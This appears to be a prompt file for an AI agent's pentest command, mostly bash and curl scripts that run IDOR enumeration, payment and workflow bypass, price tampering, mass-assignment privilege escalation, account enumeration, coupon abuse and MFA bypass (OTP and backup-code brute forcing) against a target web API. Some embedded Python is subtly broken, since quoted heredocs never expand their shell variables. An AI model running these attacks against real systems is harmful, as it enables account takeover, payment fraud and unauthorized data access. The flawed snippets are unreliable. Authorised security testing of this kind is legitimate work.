---
description: Business logic & IDOR expert — data model mapping, IDOR enumeration matrix (sequential/UUID/hash/indirect), workflow bypass, price manipulation, mass assignment, account enumeration
argument-hint: <base-api-url> [auth-token]
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-logic — Business Logic & IDOR Expert

You are an elite web application security researcher with a hacker's mindset. Your job is to find what the developers didn't think to protect — the implicit assumptions baked into business logic.

**Core philosophy**: Before running any test, answer these questions:
1. What business function does this endpoint serve?
2. What would happen to the business if I could manipulate this data?
3. What IDs, prices, states, roles, or counters can I tamper with?
4. What happens if I skip a step, run it twice, or run it out of order?

**When to use**: After `/pt-api` has enumerated the API surface. `/pt-logic` goes deeper into authorization and application state.

---

## Step 0 — Parse Arguments & Context

```bash
ARGS=<arguments>
BASE_URL=$(echo $ARGS | awk '{print $1}')
TOKEN=$(echo $ARGS | awk '{print $2}')
ENG=/home/kali/current
TARGET=$(echo $BASE_URL | sed 's|https\?://||; s|/.*||')

echo "=== pt-logic: $BASE_URL ==="
echo "Token: ${TOKEN:+provided}${TOKEN:-NOT PROVIDED — unauthenticated testing only}"
echo ""

# Read engagement context
echo "=== Existing Findings ==="
cat $ENG/notes/engagement.md 2>/dev/null | head -80 || echo "[no active engagement]"
echo ""

# What objects did previous recon find?
echo "=== Known Object Types (from previous testing) ==="
ls $ENG/loot/idor_users.csv 2>/dev/null && echo "  users (IDOR test history: $ENG/loot/idor_users.csv)"
cat $ENG/notes/engagement.md 2>/dev/null | grep -iE "user_id|order_id|invoice|document|file_id|account" | head -10
```

---

## Phase 1 — Data Model Mapping

Build a map of every object type before testing anything.

```bash
BASE_URL=<url>; TOKEN=<token>
ENG=/home/kali/current

echo "=== [Phase 1] Data Model Mapping ==="
echo "Goal: enumerate ALL object types and their ID formats"
echo ""

# Probe your own account to discover object IDs
echo "--- Your account object map ---"
AUTH="${TOKEN:+-H 'Authorization: Bearer $TOKEN'}"
for endpoint in \
    /api/me /api/profile /api/user /api/account \
    /api/v1/me /api/v1/profile /api/v1/user \
    /user /me /account/profile; do
    resp=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL$endpoint" 2>/dev/null)
    code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$BASE_URL$endpoint" 2>/dev/null)
    [ "$code" = "200" ] && {
        echo "  [200] $endpoint"
        echo "$resp" | python3 -c "
import json, sys, re
try:
    d = json.load(sys.stdin)
    # Find all fields ending in _id or matching common ID patterns
    def find_ids(obj, prefix=''):
        if isinstance(obj, dict):
            for k, v in obj.items():
                path = f'{prefix}.{k}' if prefix else k
                if isinstance(v, (int, str)):
                    if re.search(r'_id\$|^id\$|_uuid|_key', k.lower()):
                        vtype = 'sequential' if isinstance(v, int) else ('uuid-v4' if re.match(r'[0-9a-f]{8}-[0-9a-f]{4}-4', str(v)) else ('uuid-v1' if re.match(r'[0-9a-f]{8}-[0-9a-f]{4}-1', str(v)) else 'string'))
                        print(f'    {path} = {v} [{vtype}]')
                elif isinstance(v, (dict, list)):
                    find_ids(v, path)
        elif isinstance(obj, list) and obj:
            find_ids(obj[0], prefix)
    find_ids(d)
except: pass
" 2>/dev/null
    }
done

echo ""
echo "--- Enumerate related objects ---"
for endpoint in \
    /api/orders /api/invoices /api/documents /api/files \
    /api/messages /api/notifications /api/teams /api/projects \
    /api/settings /api/addresses /api/cards /api/subscriptions \
    /api/v1/orders /api/v1/invoices /api/v1/documents; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$BASE_URL$endpoint" 2>/dev/null)
    [ "$code" = "200" ] || [ "$code" = "206" ] && {
        resp=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL$endpoint" 2>/dev/null)
        echo "  [FOUND] $endpoint → $code"
        echo "$resp" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    items = d if isinstance(d, list) else d.get('data', d.get('items', d.get('results', [])))
    if items and isinstance(items, list) and items:
        first = items[0]
        ids = {k:v for k,v in first.items() if 'id' in k.lower() or k == 'uuid'}
        print(f'    First item IDs: {ids}')
        print(f'    Total items: {len(items)}')
except: pass
" 2>/dev/null
    }
done

echo ""
echo "TASK: Note down all object types and their ID formats above."
echo "      Sequential IDs → test adjacent values in Phase 2"
echo "      UUID v1 → timestamp-predictable, test in Phase 2"
echo "      UUID v4 → test indirect IDOR patterns"
```

---

## Phase 2 — IDOR Enumeration Matrix

Systematic test of every object type found in Phase 1.

```bash
BASE_URL=<url>; TOKEN=<token>
ENG=/home/kali/current
MY_ID=<your_user_id>  # from Phase 1 output

echo "=== [Phase 2] IDOR Enumeration ==="
echo ""

# Pattern A: Sequential integer ID enumeration
echo "--- Pattern A: Sequential IDOR scan ---"
# Replace /api/users/ with each object type endpoint found in Phase 1
ENDPOINTS_WITH_IDS=(
    "/api/users/ID"
    "/api/orders/ID"
    "/api/invoices/ID"
    "/api/documents/ID"
    "/api/files/ID"
)

for endpoint_tpl in "${ENDPOINTS_WITH_IDS[@]}"; do
    echo "  Testing: $endpoint_tpl"
    HITS=0
    for id in $(seq $((MY_ID - 3)) $((MY_ID + 10))) 1 2 3 100 1000 9999; do
        endpoint="${endpoint_tpl/ID/$id}"
        resp=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL$endpoint" 2>/dev/null)
        code=$(curl -sk -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "$BASE_URL$endpoint" 2>/dev/null)
        if [ "$code" = "200" ] || [ "$code" = "201" ]; then
            email=$(echo "$resp" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('email',''))" 2>/dev/null)
            role=$(echo "$resp" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('role',''))" 2>/dev/null)
            owner_id=$(echo "$resp" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('user_id',d.get('owner_id','')))" 2>/dev/null)
            echo "    [HIT] id=$id HTTP $code | email=$email role=$role owner=$owner_id"
            echo "$id,$email,$role,$owner_id" >> $ENG/loot/idor_matrix.csv 2>/dev/null
            HITS=$((HITS + 1))
        fi
    done
    [ "$HITS" = "0" ] && echo "    no hits on tested IDs"
    echo ""
done

echo ""
echo "--- Pattern B: UUID v1 prediction ---"
OBSERVED_UUID=<uuid_from_phase1>
python3 << 'PYEOF'
import uuid, sys
u_str = "$OBSERVED_UUID"
try:
    u = uuid.UUID(u_str)
    version = u.version
    print(f"UUID version: {version}")
    if version == 1:
        print(f"[PREDICTABLE] UUID v1 — timestamp-based")
        print(f"Timestamp nanoseconds: {u.time}")
        print(f"Adjacent UUIDs to test:")
        for delta in range(-5, 6):
            adj = uuid.UUID(int=u.int + delta * 100)
            print(f"  {adj}")
    elif version == 4:
        print("[UUID v4 — random, not predictable]")
        print("Test indirect IDOR: access via related objects, search, shared resources")
except Exception as e:
    print(f"Not a UUID: {e}")
PYEOF

echo ""
echo "--- Pattern C: Hash-based ID detection ---"
OBSERVED_ID=<id_from_phase1>
python3 << 'PYEOF'
import hashlib
observed = "$OBSERVED_ID".strip()
print(f"Testing if '{observed}' is a hash of a sequential integer...")
for i in range(1, 100000):
    for h, name in [
        (hashlib.md5(str(i).encode()).hexdigest(), "MD5"),
        (hashlib.sha1(str(i).encode()).hexdigest(), "SHA1"),
        (hashlib.md5(str(i).encode()).hexdigest()[:8], "MD5-truncated"),
    ]:
        if observed == h:
            print(f"[HASH IDOR] {observed} = {name}({i})")
            print(f"Next IDs: {hashlib.md5(str(i+1).encode()).hexdigest()} = {name}({i+1})")
            break
else:
    if i == 99999:
        print("[Not a hash of 1-100000 sequential integer]")
PYEOF

echo ""
echo "--- Pattern D: Indirect IDOR via related objects ---"
# Access objects via relationships (team member, org resource, shared doc)
for endpoint in \
    "/api/teams/OTHER_TEAM_ID/members" \
    "/api/teams/OTHER_TEAM_ID/documents" \
    "/api/organizations/OTHER_ORG_ID" \
    "/api/projects/OTHER_PROJECT_ID/tasks" \
    "/api/workspaces/OTHER_WS_ID/members"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $TOKEN" \
        "$BASE_URL$endpoint" 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && \
        echo "  $endpoint → HTTP $code [TEST WITH REAL IDs FROM PHASE 1]"
done

echo ""
echo "--- Pattern E: IDOR via HTTP verb swap ---"
# Some endpoints only protect GET, not PUT/DELETE
for endpoint in /api/users/$((MY_ID+1)) /api/orders/$((MY_ID+1)); do
    for method in GET PUT PATCH DELETE; do
        code=$(curl -sk -X $method -o /dev/null -w "%{http_code}" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d '{"email":"attacker@evil.com"}' \
            "$BASE_URL$endpoint" 2>/dev/null)
        [ "$code" = "200" ] || [ "$code" = "204" ] && \
            echo "  [IDOR via VERB] $method $endpoint → $code"
    done
done
```

---

## Phase 3 — Workflow Bypass & Forced Browsing

Map the application's state machine, then try to violate it.

```bash
BASE_URL=<url>; TOKEN=<token>
ENG=/home/kali/current

echo "=== [Phase 3] Workflow Bypass ==="
echo ""
echo "State machine analysis:"
echo "  Common workflows:"
echo "  Registration → Email Verify → Profile Complete → Feature Unlock"
echo "  Add to Cart → Apply Coupon → Payment → Confirmation → Fulfillment"
echo "  Free Trial → Payment Page → Subscribe → Premium Feature"
echo ""

# Skip email verification via mass assignment
echo "--- Skip email verification ---"
for payload in \
    '{"email_verified":true}' \
    '{"verified":true}' \
    '{"is_verified":true}' \
    '{"status":"verified"}' \
    '{"account_status":"active"}'; do
    curl -sk -X PUT "$BASE_URL/api/profile" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "$payload" 2>/dev/null | python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    if d.get('email_verified') or d.get('verified') or d.get('is_verified'):
        print(f'[VERIFICATION BYPASS] $payload')
except: pass
" 2>/dev/null
done

echo ""
echo "--- Skip payment (jump to confirmation) ---"
ORDER_ID=<order_id_from_phase1>
for step in \
    /api/payment/complete \
    /api/checkout/confirm \
    /api/order/confirm \
    /api/orders/$ORDER_ID/complete \
    /api/purchase/confirm; do
    code=$(curl -sk -X POST "$BASE_URL$step" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"order_id\":\"$ORDER_ID\",\"payment_status\":\"paid\",\"transaction_id\":\"fake_txn_123\"}" \
        -o /dev/null -w "%{http_code}" 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && \
        echo "  $step → HTTP $code [INVESTIGATE]"
done

echo ""
echo "--- Step replay / double submission ---"
# Run the same state-changing action twice (coupon, vote, purchase)
for endpoint in /api/coupon/apply /api/vote /api/like /api/purchase; do
    echo "  First call:"
    R1=$(curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"code":"TEST10"}' 2>/dev/null)
    echo "  $R1" | head -c 100

    echo "  Second call (replay):"
    R2=$(curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"code":"TEST10"}' 2>/dev/null)
    echo "  $R2" | head -c 100
    echo ""
done
```

---

## Phase 4 — Price & Value Manipulation

```bash
BASE_URL=<url>; TOKEN=<token>

echo "=== [Phase 4] Price & Value Manipulation ==="
echo ""

CART_ENDPOINTS=("/api/cart" "/api/orders" "/api/purchase" "/api/checkout" "/api/v1/cart")

echo "--- Negative values ---"
for endpoint in "${CART_ENDPOINTS[@]}"; do
    resp=$(curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"item_id":1,"quantity":-1,"price":-99.99,"amount":-100}' 2>/dev/null)
    echo "$resp" | grep -qiE "success|created|order" && \
        echo "  [NEGATIVE VALUE ACCEPTED] $endpoint: $resp" | head -c 200
done

echo ""
echo "--- Integer overflow ---"
for endpoint in "${CART_ENDPOINTS[@]}"; do
    curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"quantity":2147483648,"amount":9223372036854775807}' 2>/dev/null | head -c 200
done

echo ""
echo "--- Floating point precision exploit ---"
for endpoint in "${CART_ENDPOINTS[@]}"; do
    # 0.10 JPY buys something worth $10? Currency confusion
    curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"amount":0.00000001,"currency":"USD"}' 2>/dev/null | head -c 200
    # Currency confusion: send JPY amount for USD price
    curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"amount":1,"currency":"JPY","item_id":"premium_plan"}' 2>/dev/null | head -c 200
done

echo ""
echo "--- Price field injection ---"
# Send price in request body (server should ignore client-supplied price, but often doesn't)
for endpoint in "${CART_ENDPOINTS[@]}"; do
    for price in "0" "0.01" "-1" "0.001"; do
        resp=$(curl -sk -X POST "$BASE_URL$endpoint" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"item_id\":1,\"quantity\":1,\"price\":$price,\"unit_price\":$price,\"total\":$price}" 2>/dev/null)
        echo "$resp" | grep -qiE '"price":[^9]|"amount":[^9]|"total":[^9]' && \
            echo "  [CLIENT PRICE ACCEPTED] $endpoint price=$price: $(echo $resp | head -c 150)"
    done
done

echo ""
echo "--- Quantity manipulation post-discount ---"
# Apply discount first, then change quantity
echo "  Step 1: Apply 50% discount coupon"
COUPON_RESP=$(curl -sk -X POST "$BASE_URL/api/coupon/apply" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"code":"SAVE50","cart_id":"1"}' 2>/dev/null)
echo "  $COUPON_RESP" | head -c 200

echo "  Step 2: Increase quantity after discount applied"
curl -sk -X PUT "$BASE_URL/api/cart" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"item_id":1,"quantity":999}' 2>/dev/null | head -c 200
```

---

## Phase 5 — Mass Assignment & Privilege Escalation

```bash
BASE_URL=<url>; TOKEN=<token>

echo "=== [Phase 5] Mass Assignment — Privilege Escalation ==="
echo ""

# Comprehensive privilege fields to inject
PRIV_PAYLOAD='{
    "role": "admin",
    "roles": ["admin"],
    "is_admin": true,
    "admin": true,
    "is_superuser": true,
    "superuser": true,
    "user_type": "admin",
    "user_role": "administrator",
    "permission_level": 99,
    "permissions": ["admin","write","delete"],
    "plan": "enterprise",
    "subscription": "premium",
    "subscription_tier": "enterprise",
    "is_premium": true,
    "account_type": "premium",
    "verified": true,
    "email_verified": true,
    "is_verified": true,
    "active": true,
    "credits": 99999,
    "balance": 99999,
    "approved": true
}'

echo "--- Registration mass assignment ---"
REG_PAYLOAD=$(echo $PRIV_PAYLOAD | python3 -c "
import json, sys
d = json.load(sys.stdin)
d.update({'username': 'mass_assign_test_x', 'email': 'mass_test_x@example.com', 'password': 'Test123!@'})
print(json.dumps(d))
" 2>/dev/null)

for endpoint in /api/register /api/signup /api/users /api/v1/register /auth/register; do
    resp=$(curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Content-Type: application/json" \
        -d "$REG_PAYLOAD" 2>/dev/null)
    code=$(curl -sk -X POST "$BASE_URL$endpoint" \
        -H "Content-Type: application/json" \
        -d "$REG_PAYLOAD" -o /dev/null -w "%{http_code}" 2>/dev/null)
    [ "$code" = "200" ] || [ "$code" = "201" ] && {
        echo "  [REG SUCCESS] $endpoint → $code"
        echo "  Check if privileges stuck: $(echo $resp | head -c 300)"
    }
done

echo ""
echo "--- Profile update mass assignment ---"
for priv_field in "role" "is_admin" "admin" "user_type" "plan" "subscription" "balance" "credits" "verified" "is_premium"; do
    for value in '"admin"' 'true' '99999' '"enterprise"' '"administrator"'; do
        resp=$(curl -sk -X PUT "$BASE_URL/api/profile" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"$priv_field\":$value}" 2>/dev/null)
        code=$(curl -sk -X PUT "$BASE_URL/api/profile" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"$priv_field\":$value}" -o /dev/null -w "%{http_code}" 2>/dev/null)

        if [ "$code" = "200" ] || [ "$code" = "204" ]; then
            # Verify if it stuck
            current=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/me" 2>/dev/null | \
                python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('$priv_field', 'N/A'))" 2>/dev/null)
            [ "$current" != "N/A" ] && [ "$current" != "null" ] && \
                echo "  [MASS ASSIGNMENT HIT] $priv_field=$value accepted | current value: $current"
        fi
    done
done
```

---

## Phase 6 — Account Enumeration & Timing Attacks

```bash
BASE_URL=<url>

echo "=== [Phase 6] Account Enumeration & Timing ==="
echo ""

TEST_USERS=(
    "admin@$(echo $BASE_URL | sed 's|https\?://||; s|/.*||')"
    "admin"
    "administrator"
    "root"
    "test@test.com"
    "support@$(echo $BASE_URL | sed 's|https\?://||; s|/.*||')"
    "billing@$(echo $BASE_URL | sed 's|https\?://||; s|/.*||')"
    "noreply_xyz_does_not_exist_12345@fake.com"
)

echo "--- Login timing oracle ---"
echo "  Timing differences > 100ms between real/fake users → username enumeration"
for user in "${TEST_USERS[@]}"; do
    T=$(curl -sk -X POST "$BASE_URL/api/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$user\",\"password\":\"WrongPass123!\"}" \
        -o /dev/null -w "%{time_total}" 2>/dev/null)
    MSG=$(curl -sk -X POST "$BASE_URL/api/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$user\",\"password\":\"WrongPass123!\"}" 2>/dev/null | \
        python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('message','')[:60])" 2>/dev/null)
    echo "  $user: ${T}s | $MSG"
done

echo ""
echo "--- Password reset enumeration ---"
for user in "${TEST_USERS[@]}"; do
    CODE=$(curl -sk -X POST "$BASE_URL/api/password-reset" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$user\"}" -o /dev/null -w "%{http_code}" 2>/dev/null)
    MSG=$(curl -sk -X POST "$BASE_URL/api/forgot-password" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$user\"}" 2>/dev/null | head -c 100)
    echo "  $user: HTTP $CODE | $MSG"
done

echo ""
echo "--- Registration enumeration (does it say 'email already taken'?) ---"
for user in "${TEST_USERS[@]}"; do
    for endpoint in /api/register /api/signup; do
        MSG=$(curl -sk -X POST "$BASE_URL$endpoint" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$user\",\"password\":\"Test123!\"}" 2>/dev/null | head -c 150)
        echo "$MSG" | grep -qiE "already|taken|exists|registered" && \
            echo "  [USER EXISTS] $user via $endpoint: $MSG"
    done
done
```

---

## Phase 7 — Coupon & Referral Abuse

```bash
BASE_URL=<url>; TOKEN=<token>

echo "=== [Phase 7] Coupon & Referral Abuse ==="
echo ""

echo "--- Common discount/promo codes ---"
for code in \
    "ADMIN" "DEBUG" "TEST" "TEST100" "EMPLOYEE" "STAFF" \
    "FREE" "INTERNAL" "BETA" "PARTNER" "VIP" "PREMIUM" \
    "100OFF" "FULLOFF" "FREESHIP" "SAVE100" \
    "$(echo $BASE_URL | sed 's|https\?://||; s|[./].*||' | tr '[:lower:]' '[:upper:]')" \
    "BLACKFRIDAY" "CYBER" "LAUNCH" "WELCOME"; do
    resp=$(curl -sk -X POST "$BASE_URL/api/coupon/apply" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"code\":\"$code\"}" 2>/dev/null)
    echo "$resp" | grep -qiE '"success"\s*:\s*true|"discount"|"applied"|"percent"' && \
        echo "  [COUPON HIT] $code → $(echo $resp | head -c 150)"
done

echo ""
echo "--- Self-referral abuse ---"
# Get your own referral code, use it on your own account
MY_REFERRAL=$(curl -sk -H "Authorization: Bearer $TOKEN" "$BASE_URL/api/profile" 2>/dev/null | \
    python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('referral_code',d.get('invite_code','')))" 2>/dev/null)
[ -n "$MY_REFERRAL" ] && {
    echo "  Your referral code: $MY_REFERRAL"
    echo "  Attempting self-referral..."
    curl -sk -X POST "$BASE_URL/api/referral/apply" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"code\":\"$MY_REFERRAL\"}" 2>/dev/null | head -c 200
}
```

---

## Phase 8 — 2FA / MFA Bypass

**Why**: Every modern app has MFA. Bypassing it is a standard pentest deliverable. Most bypasses are business logic flaws — the MFA check is skipped, side-stepped, or can be brute-forced.

```bash
BASE_URL=<url>
TOKEN=<session_after_password_but_before_mfa>  # session cookie/token from step 1 of login

echo "=== Phase 8: 2FA / MFA Bypass ==="

echo "--- Test 1: Is pre-MFA session fully authenticated? ---"
# App issues session after password check. Does that session give access before MFA?
for endpoint in /api/me /api/profile /api/admin /api/user /api/dashboard /api/account; do
    CODE=$(curl -sk -H "Authorization: Bearer $TOKEN" \
        -H "Cookie: session=$TOKEN" \
        "$BASE_URL$endpoint" -o /dev/null -w "%{http_code}" --max-time 5 2>/dev/null)
    echo "  $endpoint → HTTP $CODE"
    [ "$CODE" = "200" ] && echo "    [!] PRE-MFA SESSION AUTHENTICATED — MFA is decorative only!"
done

echo ""
echo "--- Test 2: OTP Brute Force (rate limit test) ---"
# 6-digit TOTP = 1,000,000 codes. Common window = 30 seconds (codes ±1 = ~3 valid codes at any time)
# Test if rate limiting kicks in
for i in $(seq 1 15); do
    OTP=$(printf "%06d" $RANDOM)
    CODE=$(curl -sk -X POST "$BASE_URL/api/verify-otp" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $TOKEN" \
        -d "{\"otp\":\"$OTP\",\"code\":\"$OTP\",\"token\":\"$OTP\"}" \
        -o /dev/null -w "%{http_code}" 2>/dev/null)
    echo "  Attempt $i (OTP=$OTP): HTTP $CODE"
    [ "$CODE" = "429" ] && echo "  [OK] Rate limited at attempt $i" && break
    [ "$CODE" = "200" ] && echo "  [!] Accepted!" && break
done

echo ""
echo "--- Test 3: OTP Reuse (same code submitted twice) ---"
VALID_OTP="<your_current_valid_otp>"  # get from your authenticator app
echo "Submitting same OTP twice in quick succession..."
for i in 1 2; do
    CODE=$(curl -sk -X POST "$BASE_URL/api/verify-otp" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $TOKEN" \
        -d "{\"otp\":\"$VALID_OTP\",\"code\":\"$VALID_OTP\"}" \
        -o /tmp/otp_reuse_$i.txt -w "%{http_code}" 2>/dev/null)
    echo "  Attempt $i: HTTP $CODE | $(head -c 100 /tmp/otp_reuse_$i.txt)"
done

echo ""
echo "--- Test 4: Response Manipulation ---"
echo "Use Burp/Playwright to intercept the MFA verification response"
echo "Flip response before JS processes it:"
echo "  {\"success\":false} → {\"success\":true}"
echo "  HTTP 401 → HTTP 200"
echo "  {\"mfa_required\":true} → {\"mfa_required\":false}"
echo "  {\"verified\":false,\"token\":null} → {\"verified\":true,\"token\":\"forged_session\"}"
echo ""
echo "Testing response manipulation via parameter:"
for param in mfa_required verified step authenticated; do
    curl -sk -X POST "$BASE_URL/api/login/finalize" \
        -H "Content-Type: application/json" \
        -d "{\"$param\":false,\"skip_mfa\":true,\"bypass\":true}" \
        -o /dev/null -w "  $param=false → %{http_code}\n" 2>/dev/null
done

echo ""
echo "--- Test 5: Account Recovery Bypasses MFA ---"
echo "Password reset flow often bypasses MFA entirely"
echo "Test: request password reset for MFA-enabled account → does new session have full access?"
RESET_CODE=$(curl -sk -X POST "$BASE_URL/api/password-reset" \
    -H "Content-Type: application/json" \
    -d '{"email":"your_test_account@email.com"}' 2>/dev/null | head -3)
echo "  Reset request: $RESET_CODE"
echo "  (If you receive reset link and can set new password → test if new session requires MFA)"

echo ""
echo "--- Test 6: OAuth Login Bypasses App-Native MFA ---"
echo "If app has 'Login with Google/GitHub' → does OAuth login bypass MFA?"
for oauth_path in \
    "/auth/google" "/auth/github" "/auth/microsoft" \
    "/api/auth/oauth/google" "/login/google" "/sso/google"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$BASE_URL$oauth_path" --max-time 5 2>/dev/null)
    [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && \
        echo "  [$CODE] $oauth_path — OAuth login endpoint found"
    echo "  Test: complete OAuth login → check if MFA prompt appears"
done

echo ""
echo "--- Test 7: TOTP Secret Extraction ---"
echo "Check if TOTP setup response leaks the raw secret"
SETUP_RESP=$(curl -sk -X POST "$BASE_URL/api/mfa/setup" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"type":"totp"}' 2>/dev/null)
echo "  MFA setup response: $SETUP_RESP" | head -c 300
echo ""
echo "$SETUP_RESP" | python3 -c "
import json, sys, re
try:
    d = json.load(sys.stdin)
    secret = d.get('secret') or d.get('totp_secret') or d.get('key') or d.get('seed')
    if secret:
        print(f'  [!] TOTP SECRET EXPOSED in API response: {secret}')
        print(f'  → Use: python3 -c \"import pyotp; print(pyotp.TOTP(\\\"{secret}\\\").now())\"')
except: pass
data = sys.stdin.read() if isinstance(sys.stdin, type(sys.stdin)) else ''
secrets = re.findall(r'[A-Z2-7]{16,32}', d if isinstance(d, str) else json.dumps(d))
if secrets: print(f'  Possible base32 secrets: {secrets}')
" 2>/dev/null

echo ""
echo "--- Test 8: Backup Code Enumeration ---"
echo "Backup codes are often 6-8 char alphanumeric = brute-forceable if rate limit is weak"
for code in \
    "00000000" "12345678" "AAAAAAAA" "00000001" "99999999" \
    "ABCDEFGH" "12345678" "87654321" "11111111"; do
    CODE=$(curl -sk -X POST "$BASE_URL/api/verify-backup-code" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"code\":\"$code\",\"backup_code\":\"$code\"}" \
        -o /dev/null -w "%{http_code}" 2>/dev/null)
    echo "  backup=$code → HTTP $CODE"
    [ "$CODE" = "200" ] && echo "  [!] BACKUP CODE ACCEPTED: $code"
done
```

**Impact gate**:
- Pre-MFA session authenticated → **Critical** (full auth bypass)
- OTP brute force no rate limit → **High** (account takeover via 1M code space)
- Response manipulation bypasses MFA → **Critical** (trivial auth bypass)
- TOTP secret in API response → **Critical** (permanent MFA bypass)
- OAuth login skips MFA → **High** (auth bypass for social login users)

---

## Phase 9 — Summary & Chain Analysis (updated)

```bash
BASE_URL=<url>; ENG=/home/kali/current

echo "=== [Phase 8] Summary & Chain Exploitation ==="
echo ""
echo "Review all findings and identify chains:"
echo ""
echo "  IDOR + Mass Assignment = full account takeover chain"
echo "    1. IDOR: read another user's profile (get their email/ID)"
echo "    2. Mass Assignment: inject role=admin on update"
echo "    → Create new admin account, take over target account"
echo ""
echo "  Price Manipulation + Workflow Bypass = free premium access"
echo "    1. Price: set to 0.001 in cart"
echo "    2. Workflow: skip payment step"
echo "    → Premium subscription for free"
echo ""
echo "  Account Enumeration + No Rate Limit = targeted credential stuffing"
echo "    1. Enumeration: list all valid email addresses"
echo "    2. Rate limit bypass: X-Forwarded-For rotation"
echo "    → Targeted password spray against known-valid accounts"
echo ""
echo "IDOR hits: $(wc -l < $ENG/loot/idor_matrix.csv 2>/dev/null || echo 0)"
echo ""

# Save to engagement.md
cat >> $ENG/notes/engagement.md << 'EOF'

## Business Logic Testing Results
[Claude: fill in all findings from pt-logic]

EOF
echo "Template added to $ENG/notes/engagement.md"
```

---

## Execution Rules

- **Data model first** — never test IDOR blind. Map ALL object types before probing IDs
- **Every numeric ID is a potential IDOR** — don't skip object types because they "look" protected
- **UUID v1 is NOT secure** — always version-check UUIDs. v1 = timestamp = predictable
- **Check if privilege fields stuck** after mass assignment — always re-read /api/me after sending
- **Price in request body** — some developers think "the client sends the price, we just display it" — always test
- **Timing matters** — consistent >200ms timing difference between user states = enumeration vulnerability
- **Two-account testing** — the most reliable IDOR test: account A creates resource, account B tries to access it
- **Document each IDOR hit** with the exact curl command in `$ENG/poc/requests/`
